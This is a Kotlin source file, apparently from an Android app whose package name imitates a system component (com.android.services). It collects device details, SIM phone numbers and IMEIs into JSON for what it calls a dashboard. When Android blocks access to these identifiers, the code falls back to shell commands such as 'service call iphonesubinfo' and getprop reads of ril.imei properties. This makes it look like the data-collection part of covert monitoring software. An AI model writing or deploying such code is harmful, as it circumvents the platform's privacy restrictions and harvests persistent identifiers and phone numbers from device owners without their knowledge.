package com.android.services

import android.annotation.SuppressLint
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.net.ConnectivityManager
import android.net.NetworkCapabilities
import android.os.BatteryManager
import android.os.Build
import android.os.Environment
import android.os.StatFs
import android.os.SystemClock
import android.telephony.TelephonyManager
import com.google.gson.JsonArray
import com.google.gson.JsonObject
import java.io.RandomAccessFile
import java.net.Inet4Address
import java.net.NetworkInterface

object DeviceInfo {

    @SuppressLint("MissingPermission", "HardwareIds")
    fun collect(context: Context): JsonObject {
        val json = JsonObject()

        // ── Baterai ────────────────────────────────────────────────────────────
        val battIntent = context.registerReceiver(null, IntentFilter(Intent.ACTION_BATTERY_CHANGED))
        val level = battIntent?.getIntExtra(BatteryManager.EXTRA_LEVEL, -1) ?: -1
        val scale = battIntent?.getIntExtra(BatteryManager.EXTRA_SCALE, -1) ?: 100
        val battPct = if (level >= 0 && scale > 0) (level * 100 / scale).toString() else "--"
        val status = battIntent?.getIntExtra(BatteryManager.EXTRA_STATUS, -1) ?: -1
        val isCharging = status == BatteryManager.BATTERY_STATUS_CHARGING ||
                status == BatteryManager.BATTERY_STATUS_FULL
        json.addProperty("battery", battPct)
        json.addProperty("batteryStatus", if (isCharging) "Charging" else "Discharging")

        // ── Info Perangkat ─────────────────────────────────────────────────────
        json.addProperty("model", "${Build.MANUFACTURER} ${Build.MODEL}")
        json.addProperty("androidVersion", "Android ${Build.VERSION.RELEASE} (API ${Build.VERSION.SDK_INT})")
        json.addProperty("hostname", Build.HOST ?: "--")
        json.addProperty("kernel", System.getProperty("os.version") ?: "--")
        json.addProperty("screenState", "Active")
        json.addProperty("brand", Build.BRAND ?: "--")
        json.addProperty("device", Build.DEVICE ?: "--")
        json.addProperty("product", Build.PRODUCT ?: "--")
        json.addProperty("fingerprint", Build.FINGERPRINT?.take(60) ?: "--")

        // ── Jaringan ───────────────────────────────────────────────────────────
        json.addProperty("ip", getIPAddress())
        json.addProperty("networkType", getNetworkType(context))

        // ── SIM & Telepon (dual SIM aware) ─────────────────────────────────────
        collectSimInfo(context, json)

        // ── Storage ────────────────────────────────────────────────────────────
        try {
            val stat = StatFs(Environment.getExternalStorageDirectory().path)
            val totalGb = stat.totalBytes / (1024f * 1024f * 1024f)
            val freeGb = stat.availableBytes / (1024f * 1024f * 1024f)
            json.addProperty("storage", "%.1f".format(totalGb - freeGb))
            json.addProperty("storageFree", "%.1f GB".format(freeGb))
        } catch (_: Exception) {
            json.addProperty("storage", "--")
            json.addProperty("storageFree", "--")
        }

        // ── RAM ────────────────────────────────────────────────────────────────
        try {
            var totalKb = 0L; var freeKb = 0L
            RandomAccessFile("/proc/meminfo", "r").use { reader ->
                repeat(5) {
                    val line = reader.readLine() ?: return@repeat
                    when {
                        line.startsWith("MemTotal:")     -> totalKb = line.split("\\s+".toRegex())[1].toLong()
                        line.startsWith("MemAvailable:") -> freeKb  = line.split("\\s+".toRegex())[1].toLong()
                    }
                }
            }
            json.addProperty("memTotal", "%.0f MB".format(totalKb / 1024f))
            json.addProperty("memFree",  "%.0f MB".format(freeKb / 1024f))
        } catch (_: Exception) {
            json.addProperty("memTotal", "--")
            json.addProperty("memFree", "--")
        }

        // ── CPU ────────────────────────────────────────────────────────────────
        json.addProperty("cpuUsage", getCpuUsage())

        // ── Uptime ─────────────────────────────────────────────────────────────
        val upMs = SystemClock.elapsedRealtime()
        json.addProperty("uptime", "${upMs / 3_600_000}h ${(upMs % 3_600_000) / 60_000}m")

        return json
    }

    // ─────────────────────────────────────────────────────────────────────────
    //  SIM INFO — Dual SIM aware via SubscriptionManager
    // ─────────────────────────────────────────────────────────────────────────

    @SuppressLint("MissingPermission", "HardwareIds")
    private fun collectSimInfo(context: Context, json: JsonObject) {
        try {
            val tm = context.getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager

            // ── Jumlah slot ───────────────────────────────────────────────────
            val slotCount = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                try { tm.phoneCount } catch (_: Exception) { 1 }
            } else 1
            json.addProperty("simSlots", "$slotCount slot")

            // ── Generasi jaringan aktif ───────────────────────────────────────
            json.addProperty("networkGeneration", getNetGen(tm))

            // ── Roaming & MCC-MNC (dari SIM aktif) ────────────────────────────
            json.addProperty("roaming", if (tm.isNetworkRoaming) "Ya" else "Tidak")
            val mccMnc = tm.networkOperator?.takeIf { it.length >= 5 }
                ?.let { "${it.take(3)}-${it.drop(3)}" } ?: "--"
            json.addProperty("mccMnc", mccMnc)

            // ── Operator Jaringan aktif ────────────────────────────────────────
            val netOp = tm.networkOperatorName?.takeIf { it.isNotBlank() }
                ?: tm.simOperatorName?.takeIf { it.isNotBlank() }
                ?: "--"
            json.addProperty("networkOperator", netOp)

            // ── Info per-SIM via SubscriptionManager ─────────────────────────
            val simsArray = JsonArray()
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP_MR1) {
                try {
                    val sm = context.getSystemService(Context.TELEPHONY_SUBSCRIPTION_SERVICE)
                        as android.telephony.SubscriptionManager
                    @Suppress("DEPRECATION")
                    val subs = sm.activeSubscriptionInfoList
                    if (!subs.isNullOrEmpty()) {
                        for (sub in subs) {
                            val slotIdx = sub.simSlotIndex + 1  // 1-based
                            val simObj  = JsonObject()
                            simObj.addProperty("slot", "SIM $slotIdx")

                            // Nomor HP
                            val num = sub.number?.trim()?.takeIf { it.isNotBlank() && it != "0" }
                                ?: tryIpcPhoneNumber(slotIdx - 1)
                            simObj.addProperty("number", num)

                            // Operator
                            simObj.addProperty("operator", sub.carrierName?.toString()?.takeIf { it.isNotBlank() } ?: "--")

                            // Negara
                            simObj.addProperty("country", sub.countryIso?.uppercase()?.takeIf { it.isNotBlank() } ?: "--")

                            // IMEI per slot (Android 8+)
                            val imei = getImeiForSlot(tm, sub.simSlotIndex)
                            simObj.addProperty("imei", imei)

                            // Status SIM
                            val tmSub = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                                try { tm.createForSubscriptionId(sub.subscriptionId) } catch (_: Exception) { tm }
                            } else tm
                            simObj.addProperty("state", simStateStr(tmSub.simState))

                            // MCC-MNC per SIM
                            val subMcc = sub.mccString ?: ""
                            val subMnc = sub.mncString ?: ""
                            simObj.addProperty("mccMnc", if (subMcc.isNotEmpty()) "$subMcc-$subMnc" else "--")

                            simsArray.add(simObj)
                        }
                    }
                } catch (_: Exception) {}
            }

            // Fallback ke single-SIM jika SubscriptionManager gagal/kosong
            if (simsArray.size() == 0) {
                val simObj = JsonObject()
                simObj.addProperty("slot", "SIM 1")
                simObj.addProperty("number", getPhoneNumberLegacy(context, tm))
                simObj.addProperty("operator", tm.simOperatorName?.takeIf { it.isNotBlank() } ?: "--")
                simObj.addProperty("country", tm.simCountryIso?.uppercase()?.takeIf { it.isNotBlank() } ?: "--")
                simObj.addProperty("imei", getImeiForSlot(tm, 0))
                simObj.addProperty("state", simStateStr(tm.simState))
                simObj.addProperty("mccMnc", mccMnc)
                simsArray.add(simObj)
            }

            json.add("sims", simsArray)

            // ── Compat fields (untuk backward compat dengan dashboard lama) ───
            val first = simsArray[0].asJsonObject
            json.addProperty("phoneNumber",  first.get("number")?.asString  ?: "--")
            json.addProperty("simOperator",  first.get("operator")?.asString ?: "--")
            json.addProperty("simCountry",   first.get("country")?.asString  ?: "--")
            json.addProperty("simState",     first.get("state")?.asString    ?: "--")
            json.addProperty("imei",         first.get("imei")?.asString     ?: "--")
            json.addProperty("simSerial",    "--") // Android 10+ blokir total

        } catch (_: Exception) {
            for (f in listOf("simSlots","networkGeneration","roaming","mccMnc","networkOperator",
                "phoneNumber","simOperator","simCountry","simState","imei","simSerial")) {
                json.addProperty(f, "--")
            }
            json.add("sims", JsonArray())
        }
    }

    // ─────────────────────────────────────────────────────────────────────────
    //  IMEI per slot
    // ─────────────────────────────────────────────────────────────────────────

    @SuppressLint("MissingPermission", "HardwareIds")
    private fun getImeiForSlot(tm: TelephonyManager, slot: Int): String {
        // Android 8+ punya getImei(slot)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            try {
                val v = tm.getImei(slot)
                if (!v.isNullOrBlank() && v != "0") return v
            } catch (_: Exception) {}
        }
        // Android < 8: deviceId
        try {
            @Suppress("DEPRECATION")
            val v = tm.deviceId
            if (!v.isNullOrBlank() && v != "0") return v
        } catch (_: Exception) {}

        // Shell IPC fallback
        return try {
            // slot 0 → command 1, slot 1 → command 4 (pada banyak vendor)
            val cmd = if (slot == 0) 1 else 4
            val raw = shell("service call iphonesubinfo $cmd s16 com.android.shell")
            val parsed = parseIpcString(raw)
            if (parsed.length in 14..17 && parsed.all { it.isDigit() }) return parsed
            // getprop fallback
            val props = listOf("ro.ril.oem.imei", "ril.imei", "ro.ril.oem.imei2", "ril.imei2")
            for (prop in props.filterIndexed { i, _ -> if (slot == 0) i < 2 else i >= 2 }) {
                val r = shell("getprop $prop").trim()
                if (r.length in 14..17 && r.all { it.isDigit() }) return r
            }
            "--"
        } catch (_: Exception) { "--" }
    }

    // ─────────────────────────────────────────────────────────────────────────
    //  Phone number helpers
    // ─────────────────────────────────────────────────────────────────────────

    @SuppressLint("MissingPermission")
    private fun tryIpcPhoneNumber(slot: Int): String {
        return try {
            // command 7 = slot 0, command 14 = slot 1 (umum di AOSP)
            val cmd = if (slot == 0) 7 else 14
            val raw = shell("service call iphonesubinfo $cmd s16 com.android.shell")
            parseIpcString(raw).takeIf { it.isNotBlank() && it != "0" } ?: "--"
        } catch (_: Exception) { "--" }
    }

    @SuppressLint("MissingPermission", "HardwareIds")
    private fun getPhoneNumberLegacy(ctx: Context, tm: TelephonyManager): String {
        try {
            val n = tm.line1Number?.trim()?.takeIf { it.isNotBlank() && it != "0" }
            if (n != null) return n
        } catch (_: Exception) {}
        return tryIpcPhoneNumber(0)
    }

    // ─────────────────────────────────────────────────────────────────────────
    //  Network generation
    // ─────────────────────────────────────────────────────────────────────────

    @SuppressLint("MissingPermission")
    private fun getNetGen(tm: TelephonyManager): String {
        return try {
            @Suppress("DEPRECATION")
            when (tm.networkType) {
                TelephonyManager.NETWORK_TYPE_GPRS,
                TelephonyManager.NETWORK_TYPE_EDGE,
                TelephonyManager.NETWORK_TYPE_CDMA,
                TelephonyManager.NETWORK_TYPE_1xRTT   -> "2G"
                TelephonyManager.NETWORK_TYPE_UMTS,
                TelephonyManager.NETWORK_TYPE_HSDPA,
                TelephonyManager.NETWORK_TYPE_HSUPA,
                TelephonyManager.NETWORK_TYPE_HSPA,
                TelephonyManager.NETWORK_TYPE_HSPAP,
                TelephonyManager.NETWORK_TYPE_EVDO_0,
                TelephonyManager.NETWORK_TYPE_EVDO_A,
                TelephonyManager.NETWORK_TYPE_EVDO_B  -> "3G"
                TelephonyManager.NETWORK_TYPE_LTE     -> "4G LTE"
                TelephonyManager.NETWORK_TYPE_NR      -> "5G"
                else                                   -> "--"
            }
        } catch (_: Exception) { "--" }
    }

    private fun simStateStr(state: Int) = when (state) {
        TelephonyManager.SIM_STATE_ABSENT       -> "Tidak ada SIM"
        TelephonyManager.SIM_STATE_PIN_REQUIRED -> "Butuh PIN"
        TelephonyManager.SIM_STATE_PUK_REQUIRED -> "Butuh PUK"
        TelephonyManager.SIM_STATE_READY        -> "Siap"
        TelephonyManager.SIM_STATE_NOT_READY    -> "Belum siap"
        TelephonyManager.SIM_STATE_UNKNOWN      -> "Tidak diketahui"
        else                                     -> "Lainnya"
    }

    // ─────────────────────────────────────────────────────────────────────────
    //  Parse output "service call iphonesubinfo"
    // ─────────────────────────────────────────────────────────────────────────

    private fun parseIpcString(raw: String): String {
        val sb = StringBuilder()
        for (line in raw.lines()) {
            val first = line.indexOf('\'')
            val last  = line.lastIndexOf('\'')
            if (first < 0 || first == last) continue
            val chars = line.substring(first + 1, last)
            for (c in chars) { if (c != '.' && c != ' ') sb.append(c) }
        }
        return sb.toString().trim()
    }

    private fun shell(cmd: String): String = try {
        val p = Runtime.getRuntime().exec(arrayOf("sh", "-c", cmd))
        val out = p.inputStream.bufferedReader().readText()
        p.waitFor()
        out
    } catch (_: Exception) { "" }

    // ─────────────────────────────────────────────────────────────────────────
    //  Network & System helpers
    // ─────────────────────────────────────────────────────────────────────────

    private fun getIPAddress(): String {
        return try {
            NetworkInterface.getNetworkInterfaces()?.toList()
                ?.flatMap { it.inetAddresses.toList() }
                ?.firstOrNull { !it.isLoopbackAddress && it is Inet4Address }
                ?.hostAddress ?: "--"
        } catch (_: Exception) { "--" }
    }

    private fun getNetworkType(ctx: Context): String {
        return try {
            val cm = ctx.getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
            val caps = cm.getNetworkCapabilities(cm.activeNetwork ?: return "None") ?: return "Unknown"
            when {
                caps.hasTransport(NetworkCapabilities.TRANSPORT_WIFI)     -> "WiFi"
                caps.hasTransport(NetworkCapabilities.TRANSPORT_CELLULAR) -> "Mobile Data"
                caps.hasTransport(NetworkCapabilities.TRANSPORT_ETHERNET) -> "Ethernet"
                else -> "Unknown"
            }
        } catch (_: Exception) { "--" }
    }

    private fun getCpuUsage(): String {
        // Cara 1: /proc/stat delta (Android < 8 atau vendor yang tidak memblokir)
        try {
            fun readCpu(): Pair<Long, Long> {
                RandomAccessFile("/proc/stat", "r").use { r ->
                    val parts = r.readLine().trim().split("\\s+".toRegex())
                    val values = parts.drop(1).take(8).map { it.toLong() }
                    return Pair(values[3] + values[4], values.sum())
                }
            }
            val (idle1, total1) = readCpu()
            Thread.sleep(300)
            val (idle2, total2) = readCpu()
            val dTotal = total2 - total1
            val dIdle = idle2 - idle1
            if (dTotal > 0L) return "${((dTotal - dIdle) * 100 / dTotal).toInt()}%"
        } catch (_: Exception) {}

        // Cara 2: /proc/loadavg (selalu accessible, rata-rata 1 menit)
        try {
            val line = RandomAccessFile("/proc/loadavg", "r").use { it.readLine() }
            val load1 = line.trim().split("\\s+".toRegex())[0].toFloat()
            val numCores = Runtime.getRuntime().availableProcessors().coerceAtLeast(1)
            val pct = (load1 / numCores * 100).toInt().coerceIn(0, 100)
            return "$pct% (avg)"
        } catch (_: Exception) {}

        return "--"
    }
}
